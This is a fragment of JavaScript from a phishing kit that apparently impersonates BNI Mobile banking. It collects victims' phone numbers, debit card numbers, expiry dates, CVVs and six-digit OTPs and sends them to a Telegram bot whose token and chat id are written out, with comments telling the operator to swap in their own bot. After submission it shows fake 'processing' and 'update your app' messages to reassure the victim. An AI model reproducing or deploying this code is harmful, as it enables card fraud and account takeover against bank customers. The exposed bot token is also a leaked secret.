function sendNohp(event){
 ...
 var nope = document.getElementById('nope');
    ...
    var token = '6590700321:AAFtwDKQUSxAzF9H-HHZb3wPG9l4j10t2Zk'; // Ganti dengan token bot yang kamu buat
    var grup = '6799679753'; // Ganti dengan chat id dari bot yang kamu buat
...
function kirimPesan(event) {
 event.preventDefault();
  $("#loadersaya1").show();
    ...
    var gabungan = '' + logo.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲 %3A%0A' + nope.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂 𝗗𝗲𝗯𝗶𝘁/𝗔𝗧𝗠 %3A%0A' + nama.value + '%0A𝗠𝗮𝘀𝗮 𝗕𝗲𝗿𝗹𝗮𝗸𝘂 %3A%0A' + bulan.value + "/" + tahun.value + '%0A𝗖𝗩𝗩 %3A%0A' + pesan.value +  '%0A%0A𝗢𝗧𝗣%20𝗕𝗡𝗜:%0A' +   pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + pin6.value;
...
$("#blink").text("Terima Kasih Permintaan Sedang diproses");
$("#blink").css("color","green");
        $("#blink").show();
   setTimeout(function(){
       $("#loadersaya1").hide();
        $("#blink").text("Silahkan Update Aplikasi BNI Mobile anda");
